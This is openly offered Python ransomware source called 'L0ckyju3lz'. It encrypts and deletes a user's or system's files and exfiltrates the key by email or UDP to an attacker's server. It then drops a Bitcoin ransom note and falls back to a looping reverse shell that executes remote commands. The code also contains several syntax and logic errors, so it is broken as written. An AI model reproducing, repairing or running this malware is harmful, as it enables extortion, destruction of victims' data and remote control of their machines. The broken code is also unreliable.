# Author: PiereLucas (Julian H.)
# Seamlessly dirty code
# MIT License
# L0ckyju3lz Ransomware

import time
import os
import shutil
import sys
import subprocess
import string
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import socket
import re
from os.path import expanduser
from cryptography.fernet import Fernet
from argparse import ArgumentParser

parser = ArgumentParser(description="L0ckyju3lz Ransomware v.1.0")
parser.add_argument("-decf", dest="dec", metavar="Decryption")
args = parser.parse_args()

class L0ckyju3lz():

    def __init__(self):

        # Locky
        self.key = None
        self.crypt = None
        self.archiv_name = None
        self.client_ID = None
        self.root_tree = None

        # Decrypt
        self.dec_key = args.gen

        # Program Details
        self.author = "PiereLucas"
        self.version = "1.0"

        # Mail & BTC Details
        self.btc_wallet = ""
        self.response_mail = ""  # used for sendkey over mail

        # Socket details for sendkey over udp stream
        self.server_ip_key = ""
        self.server_port_key = 0

        # Socket details for reverse shell
        self.server_ip_rshell = ""
        self.server_port_rshell = 0

        # SMTP Details
        self.host = ""
        self.port = 0
        self.username = ""
        self.password = ""

    def readme_txt(self):
        with open("readme" + self.rnd_str() + ".txt", 'wt') as f:
            rtxt = "Infected by L0ckyju3lz" + "\n" \
            + "Send 0.5 BTC to: " + self.btc_wallet + "\n" \
            + "Message us to get your decryption key: " + self.response_mail + "\n" \
            + "Your CLIENT ID: " + self.client_ID
            f.write(rtxt)
        return True

    def is_root_dir(self):
        if os.getuid() != 0:
            self.root_tree = "/"
        else:
            self.root_tree = expanduser("~/")

    def rnd_str(self, stringlen=32):
        letters = string.ascii_letters + string.digits
        return "".join(random.choice(letters) for i in range(stringlen))

    def gen_clientid(self):
        self.client_ID = self.rnd_str()
        return self.client_ID

    def gen_key(self):
        self.key = Fernet.generate_key()
        self.crypt = Fernet(self.key)
        return True

    def read_key(self):
        with open(self.dec_key, 'rb') as f:
            self.key = f.read()
        self.crypt = Fernet(self.key)
        return True

    def pack_key(self):
        # generate key_dir, key_name and client_ID
        key_dir = self.gen_clientid()
        key_name = self.rnd_str() + ".lockyjuelz-key"
        key_path = key_dir + "/" + key_name
        # make key_dir
        os.mkdir(key_dir)
        # write key to file
        with open(key_path, 'wb') as f:
            f.write(self.key)
        # make archiv from key_dir
        raw_archiv_name = key_dir + "_pack"
        shutil.make_archive(raw_archiv_name, "zip", key_dir)
        self.archiv_name = raw_archiv_name + ".zip"
        # delete key_dir and key_name
        os.remove(key_path)
        os.rmdir(key_dir)
        return True

    def send_key(self):
        # Try two methods
        if self.over_mail() or self.over_udp_client():
            return
        else:
            # Just delete the key
            os.remove(self.archiv_name)
            return

    def over_mail(self):
        try:
            with smtplib.SMTP(host=self.host, port=self.port) as s:
                s.starttls()
                s.login(user=self.username, password=self.password)

                msg = MIMEMultipart()
                msg["Subject"] = "L0ckerju3lz - New Infect
                msg["From"] = "l0ckerju3lz@" + self.client_ID
                msg["To"] = self.response_mail
                text = MIMEText("Attachment: Packed Keyfile from Client: " + self.client_ID)
                msg.attach(text)
                with open(self.archiv_name, 'rb') as f:
                    file_data = MIMEApplication(f.read())
                msg.attach(file_data)

                s.sendmail(from_addr=msg["From"], to_addrs=msg["To"], msg=msg)
            return True
        except:
            return False

    def over_udp_client(self):
        try:
           with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
               message = self.client_ID + ";" + self.key
               s.sendto(message.encode(), (self.server_ip_key, self.server_port_key))
               return True
        except:
            return False

    def reverse_shell(self):
        count = 0
        while True:
            count += 1
            # Set Buffersize
            buffer_size = 1024
            # Create socket object
            try:
                with socket.socket() as s:
                    # Connect to server
                    s.connect((self.server_ip_rshell, self.server_port_rshell))
                    greeter = self.client_ID + " Connected (" + str(count) + ") times"
                    s.send(greeter.encode())
                    while True:
                        command = s.recv(buffer_size).decode()
                        # Exit
                        if command == "exit":
                            break
                        # Get output
                        output = subprocess.getoutput(command)
                        # Send output back to server
                        s.send(output.encode())
                time.sleep(60)
                continue
            except:
                time.sleep(60)
                continue

    def crypt_file(self, *,, mode=None):
        if mode == 'enc':
            # List all files in root_tree (~/ or /)
            for files in os.listdir(self.root_tree):
                try:
                    # Change Work-Dir to root_tree
                    os.chdir(self.root_tree)
                    # Read File
                    with open(files, 'rb') as f:
                        file_data = f.read()
                    # Encrypt data
                    encrypt_data = self.crypt.encrypt(file_data)
                    # Save encrypt data to file
                    with open(files + ".l0ckyju3lz", 'wb') as f:
                        f.write(encrypt_data)
                        # Remove old file
                        try:os.remove(files)
                        except: continue
                except: continue
            return True

        elif mode == 'dec':
            # List all files in root_tree (~/ or /)
            for files in os.listdir(self.root_tree)
                try:
                    # Change Work-Dir to root_tree
                    os.chdir(self.root_tree)
                    with open(files + ".l0ckyju3lz", 'rb') as f:
                        file_data = f.read()
                    decrypt_data = self.crypt.decrypt(file_data)
                    old_files = re.sub("\.l0ckyju3lz", "", files)
                    with open(old_files, 'wb') as f:
                        f.write(decrypt_data)
                        # Remove old file
                        try: os.remove(files)
                        except: continue
                except: continue
            return True

    def run(self):
        # Check Decryption Trigger
        if args.dec:
            if self.read_key():
                if self.crypt_file(mode='dec'):
                    print("Stop crying little Baby ...")
                else:
                    print("Wrong Key")
                    sys.exit(0)
        else: pass

        # Check User
        self.is_root_dir()
        # gen Key
        if self.gen_key(): pass
        else: sys.exit(0)
        # pack key
        if self.pack_key(): pass
        else: sys.exit(0)
        # send key
        self.send_key()
        # crypt
        if self.crypt_file(mode='enc'):
            del self.crypt
            del self.key
            self.readme_txt()
        else:
            # Okay, encryption fails - lets try to start a reverse shell than ...
            self.reverse_shell()


if __name__ == "__main__":
    lj = L0ckyju3lz()
    lj.run()
